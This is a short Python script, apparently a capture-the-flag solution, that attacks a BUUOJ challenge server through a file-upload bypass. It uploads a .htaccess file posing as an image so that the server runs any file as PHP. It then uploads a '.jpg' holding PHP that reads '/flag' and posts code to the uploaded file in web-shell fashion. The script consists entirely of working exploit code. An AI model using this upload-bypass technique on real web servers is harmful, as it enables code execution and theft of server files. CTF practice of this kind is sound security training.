import requests

url = "http://9fe44513-faa4-4a17-a473-c3ecd8533b6e.node4.buuoj.cn:81/"
session = requests.session()

htaccess = {'uploaded': ('.htaccess', "SetHandler application/x-httpd-php", 'image/jpeg')}
res_hta = session.post(url, files=htaccess)

files = {'uploaded': ('123.jpg', "<script language=\"php\">echo file_get_contents(\"/flag\");</script>", 'image/jpeg')}
res_jpg = session.post(url, files=files)
print(res_jpg.text)

res_shell = session.post(url + res_jpg.text[-69:-22], data = {'a':'echo file_get_contents(\'/flag\');'})

print(res_shell.text)